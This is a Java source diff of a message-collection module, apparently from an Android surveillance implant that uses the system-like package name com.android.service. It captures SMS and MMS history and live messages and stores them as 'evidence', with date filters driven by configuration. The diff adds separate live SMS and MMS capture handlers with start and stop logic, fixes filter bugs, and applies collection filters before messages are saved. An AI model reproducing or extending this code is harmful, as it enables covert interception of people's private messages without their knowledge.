@@ -18,8 +18,6 @@ import java.util.Iterator;
 
 import com.android.service.LogR;
 import com.android.service.Messages;
-import com.android.service.Mms;
-import com.android.service.Sms;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ChildConf;
 import com.android.service.conf.ConfModule;
@@ -27,11 +25,15 @@ import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
-import com.android.service.interfaces.SmsMmsHandler;
 import com.android.service.listener.ListenerSms;
 import com.android.service.module.message.Filter;
+import com.android.service.module.message.Mms;
 import com.android.service.module.message.MmsBrowser;
+import com.android.service.module.message.MmsHandler;
+import com.android.service.module.message.Sms;
 import com.android.service.module.message.SmsBrowser;
+import com.android.service.module.message.SmsHandler;
+
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
@@ -52,6 +54,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
 
+	SmsHandler smsHandler;
+	MmsHandler mmsHandler;
+
 	Markup storedMMS;
 	Markup storedSMS;
 
@@ -65,25 +70,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private int lastMMS;
 
 	// private SmsHandler smsHandler;
-
-	@Override
-	public void actualStart() {
-		ListenerSms.self().attach(this);
-
-		if (smsEnabled) {
-			initSms();
-		}
-
-		if (mmsEnabled) {
-			initMms();
-		}
-
-		if (smsEnabled || mmsEnabled) {
-			// Iniziamo la cattura live
-			final SmsMmsHandler smsHandler = new SmsMmsHandler(smsEnabled, mmsEnabled);
-			smsHandler.start();
-		}
-	}
 
 	@Override
 	public boolean parse(ConfModule conf) {
@@ -109,7 +95,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
-
 			// mail 1=mail, 2=enabled
 			ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
 			mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
@@ -133,7 +118,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			smsEnabled = smsJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
 			String digestConfSms = "s" + smsEnabled;
 			if (smsEnabled) {
-				ChildConf mailFilter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
+				ChildConf mailFilter = smsJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
 				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
 				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
 				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
@@ -149,7 +134,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			mmsEnabled = mmsJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
 			String digestConfMms = "M" + mmsEnabled;
 			if (mmsEnabled) {
-				ChildConf mailFilter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
+				ChildConf mailFilter = mmsJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
 				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
 				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
 				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
@@ -194,6 +179,47 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		return true;
 	}
 
+	@Override
+	public void actualStart() {
+		ListenerSms.self().attach(this);
+
+		if (smsEnabled) {
+			initSms();
+		}
+
+		if (mmsEnabled) {
+			initMms();
+		}
+
+		if (smsEnabled) {
+			// Iniziamo la cattura live
+			smsHandler = new SmsHandler();
+			smsHandler.start();
+		}
+
+		if (mmsEnabled) {
+			// Iniziamo la cattura live
+			mmsHandler = new MmsHandler();
+			mmsHandler.start();
+		}
+	}
+
+	@Override
+	public void actualStop() {
+		ListenerSms.self().detach(this);
+		if (smsHandler != null) {
+			smsHandler.quit();
+		}
+		if (mmsHandler != null) {
+			mmsHandler.quit();
+		}
+	}
+
+	@Override
+	public void actualGo() {
+
+	}
+
 	private void initMms() {
 		if (storedMMS.isMarkup()) {
 			try {
@@ -214,7 +240,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	public synchronized void updateMarkupMMS(int value) {
 		try {
-			lastMMS=value;
+			lastMMS = value;
 			storedMMS.writeMarkupSerializable(new Integer(value));
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
@@ -232,7 +258,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			try {
 				final Mms mms = iterMms.next();
 				mms.print();
-				saveMms(mms);
+				if (filterMmsCollect.filterMessage(mms.getDate(), mms.getSize(), 0) == Filter.FILTERED_OK) {
+					saveMms(mms);
+				}
 			} catch (Exception ex) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readHistoricMms) Error: " + ex);
@@ -261,19 +289,10 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		while (iterSms.hasNext()) {
 			final Sms s = iterSms.next();
-			saveSms(s);
+			if (filterSmsCollect.filterMessage(s.getDate(), s.getSize(), 0) == Filter.FILTERED_OK) {
+				saveSms(s);
+			}
 		}
-	}
-
-	@Override
-	public void actualStop() {
-		ListenerSms.self().detach(this);
-		// smsHandler.quit();
-	}
-
-	@Override
-	public void actualGo() {
-
 	}
 
 	private void saveSms(Sms sms) {
@@ -296,7 +315,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 		final String address = mms.getAddress();
 		// MMS Subject:
-		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject()+ "\n" 
+		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject() + "\n"
 				+ Messages.getString("10.4") + mms.getBody()); //$NON-NLS-1$
 		final long date = mms.getDate();
 
@@ -347,10 +366,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		saveMms(mms);
 		int id = mms.getId();
 		updateMarkupMMS(id);
+
 		return 0;
 	}
 
-	public synchronized int getLastManagedMmsId() {		
+	public synchronized int getLastManagedMmsId() {
 		return lastMMS;
 	}
 }
